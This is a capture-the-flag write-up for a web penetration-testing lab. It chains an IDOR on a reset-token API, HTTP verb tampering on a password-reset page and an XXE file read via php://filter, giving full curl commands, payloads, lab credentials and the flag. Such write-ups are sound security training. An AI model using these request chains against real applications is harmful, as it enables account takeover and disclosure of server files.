# Section 18 — Skills Assessment

**Scenario:** Web app penetration test on a social networking app. Combine all three module attacks (Verb Tampering, IDOR, XXE) to escalate from a regular user to admin and read `/flag.php`.

**Target:** `154.57.164.75:31605`
**Creds:** `htb-student` / `Academy_student!`

---

## The Full Chain

```
1. Recon → find /api.php/{user,token}/{uid}, /reset.php, /event.php (admin-gated)
2. IDOR on /api.php/token/{uid}  → leak reset tokens for any user
3. Verb tampering on /reset.php  → bypass "Access Denied" with PUT
4. Enumerate to find admin uid   → uid=52 (a.corrales)
5. Login as admin                → access /event.php
6. XXE on /addEvent.php          → read /flag.php via php://filter
```

Each step is a different OWASP top-10 issue. Chain forces all three to land.

---

## Step 1 — Authenticate and Map the App

```bash
URL="http://154.57.164.75:31605"
rm -f /tmp/sa_cookies.txt

# Login as htb-student
curl -sk -i -c /tmp/sa_cookies.txt -X POST "$URL/index.php" \
  -d "username=htb-student&password=Academy_student!"
```

Response sets:
```
Set-Cookie: PHPSESSID=...; path=/
Set-Cookie: uid=74; ...
Location: /profile.php
```

Note the `uid=74` cookie — **the app reads role/identity from a client-side cookie**. This is the IDOR seed.

### Map endpoints
```bash
# Profile JS reveals the API pattern
curl -sk -b /tmp/sa_cookies.txt "$URL/profile.php" | grep fetch
# fetch(`/api.php/user/${$.cookie("uid")}`, ...)

# Settings JS reveals the reset flow
curl -sk -b /tmp/sa_cookies.txt "$URL/settings.php" | grep -B1 -A10 fetch
# 1. fetch /api.php/token/<uid> → returns token
# 2. fetch /reset.php POST uid=...&token=...&password=... → resets
```

### Discover hidden endpoints
```bash
ffuf -u "$URL/FUZZ" -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt \
  -e .php -t 50 -fc 404 -s
```
Hits: `event.php`, `config.php`, `reset.php`, `api.php`, `profile.php`, `settings.php`, `index.php`

`event.php` returns 301 → /index.php for our session → admin-only.

---

## Step 2 — IDOR on Token Endpoint

The reset flow:
```javascript
fetch(`/api.php/token/${$.cookie("uid")}`)   // Step A: get token
fetch(`/reset.php`, { method: 'POST',         // Step B: reset password
  body: `uid=${$.cookie("uid")}&token=${token}&password=${pw}` });
```

The token endpoint trusts whatever uid we put in the URL — no session check:
```bash
curl -sk -b /tmp/sa_cookies.txt "$URL/api.php/token/1"
# {"token":"e51a7c5e-17ac-11ec-8e1e-2f59f27bf33c"}

curl -sk -b /tmp/sa_cookies.txt "$URL/api.php/token/52"
# {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
```

**Classic GET IDOR** — we can grab any user's reset token.

---

## Step 3 — Verb Tampering on /reset.php

Naive attempt — POST with someone else's uid:
```bash
TOKEN=$(curl -sk -b /tmp/sa_cookies.txt "$URL/api.php/token/52" | grep -oE '[a-f0-9-]{36}')

curl -sk -b /tmp/sa_cookies.txt -X POST "$URL/reset.php" \
  -d "uid=52&token=$TOKEN&password=Pwnd123!"
# → "Access Denied"
```

The auth check rejects POST where `$_POST['uid']` ≠ session uid. But try other verbs:

```bash
for verb in POST PUT DELETE PATCH OPTIONS; do
  printf "%-8s  " "$verb"
  curl -sk -b /tmp/sa_cookies.txt -X $verb "$URL/reset.php" \
    -d "uid=52&token=$TOKEN&password=Pwnd123!"
  echo
done
# POST     Access Denied
# PUT      Missing parameters
# DELETE   Missing parameters
# PATCH    Missing parameters
# OPTIONS  Missing parameters
```

PUT bypasses the auth check (the validator only inspects `$_POST` data, which is empty for PUT). But the action handler reads `$_REQUEST` — which is also empty for PUT body data.

**Bypass:** send the params via query string. PUT-with-query-string puts data in `$_GET` → included in `$_REQUEST`:
```bash
curl -sk -b /tmp/sa_cookies.txt -X PUT \
  "$URL/reset.php?uid=52&token=$TOKEN&password=Pwnd123!"
# → "Password changed successfully"
```

This is the textbook input-source-mismatch verb tampering from Section 4.

---

## Step 4 — Find the Admin

Tried uid=1 (s.applewhite) — looked admin-y, but `event.php` still redirected after login. Need to find the real admin.

```bash
# Enumerate via GET IDOR — look at company field
for i in $(seq 1 100); do
  resp=$(curl -sk -b /tmp/sa_cookies.txt "$URL/api.php/user/$i")
  echo "$resp" | grep -i administrator && echo "  → uid=$i"
done
# {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"} → uid=52
```

uid=52 has `"company": "Administrator"` — telltale sign in this app's data.

```bash
# Reset admin password using same verb-tamper IDOR chain
TOKEN52=$(curl -sk -b /tmp/sa_cookies.txt "$URL/api.php/token/52" | grep -oE '[a-f0-9-]{36}')
curl -sk -b /tmp/sa_cookies.txt -X PUT \
  "$URL/reset.php?uid=52&token=$TOKEN52&password=Pwnd123!"

# Login as a.corrales
rm -f /tmp/sa_52.txt
curl -sk -c /tmp/sa_52.txt -X POST "$URL/index.php" \
  -d "username=a.corrales&password=Pwnd123!"

# event.php now returns 200 instead of 301
curl -sk -b /tmp/sa_52.txt "$URL/event.php" -o /tmp/event.html
```

---

## Step 5 — XXE on /addEvent.php

`event.php` source reveals an XML-based event creation flow:
```javascript
function XMLFunction() {
    var xml = `
    <root>
        <name>${$('#name').val()}</name>
        <details>${$('#details').val()}</details>
        <date>${$('#date').val()}</date>
    </root>`;
    fetch(`addEvent.php`, { method: 'POST', body: xml, ... });
}
```

The server reflects `<name>` back in the response (`Event '...' has been created.`).

### Confirm entity expansion
```bash
curl -sk -b /tmp/sa_52.txt -X POST "$URL/addEvent.php" \
  --data '<!DOCTYPE r [<!ENTITY x "INJECTED">]><root><name>&x;</name><details>x</details><date>2026-05-14</date></root>'
# → "Event 'INJECTED' has been created."
```

Entity expansion works.

### Confirm file read
```bash
curl -sk -b /tmp/sa_52.txt -X POST "$URL/addEvent.php" \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hosts">]><root><name>&x;</name><details>x</details><date>2026-05-14</date></root>'
# → Event '127.0.0.1 localhost ...' has been created.
```

Plus disclosed the K8s pod hostname: `ng-2393564-webattacksasmt-zbtcz-5c469878d8-vwwcf`.

### Read /flag.php
PHP source contains `<?` so `file://` would corrupt parsing — use the PHP base64 filter:
```bash
RESP=$(curl -sk -b /tmp/sa_52.txt -X POST "$URL/addEvent.php" \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]><root><name>&x;</name><details>x</details><date>2026-05-14</date></root>')

echo "$RESP" | grep -oE "Event '[A-Za-z0-9+/=]+'" | sed "s/Event '//;s/'//" | base64 -d
```

Output:
```php
<?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

---

## Flag

**`HTB{m4573r_w3b_4774ck3r}`**

---

## What Each Vulnerability Contributed

| Step | Vulnerability | Module Section |
|------|---------------|----------------|
| Read other users' reset tokens | IDOR (info disclosure) | S7-10 |
| Bypass uid auth check on reset | Verb tampering (input source mismatch) | S3-4 |
| Identify admin (via enumeration) | Mass IDOR enumeration | S8 |
| Reach admin-only event creator | (privilege escalation) | — |
| Read /flag.php source | XXE → `php://filter` | S14 |

Removing any single one breaks the chain. The lab is calibrated to require all three primitives.

---

## Key Takeaways

- **Client-side trust is the root cause throughout.** The app trusts `uid` cookie for identity; trusts the URL-path uid for token disclosure; trusts the XML body for event data. Each is exploitable.
- **`$_REQUEST` vs `$_POST`** — the verb-tampering trick of "auth check on $_POST, action on $_REQUEST" is the same pattern as Section 4. Always test PUT with query-string parameters.
- **Find the admin via data fingerprinting** — `company=Administrator` is the giveaway. Sequential uid enumeration always reveals it.
- **XXE on a contact/event form is the canonical primitive** for source disclosure. The reflected element (`<name>` here) is the read channel.
- **`php://filter/convert.base64-encode`** is the universal source-read primitive on PHP targets.
- The K8s pod hostname leak (`ng-2393564-...`) shows even read-only XXE produces internal-infra recon — useful for a real engagement's report.

---

## If You Got Stuck

| Symptom | Fix |
|---------|-----|
| event.php redirects 301 for everyone | Find a user with admin privilege — check `company` field on every uid |
| reset.php returns "Access Denied" | Use PUT with query-string params instead of POST |
| PUT with body returns "Missing parameters" | Move params to query string; PUT body isn't parsed as $_POST |
| addEvent.php with file:// returns nothing for PHP source | Use `php://filter/convert.base64-encode/resource=/flag.php` |
| Flag path /var/www/html/flag.php fails | Try `/flag.php` at filesystem root — same as Section 15 |
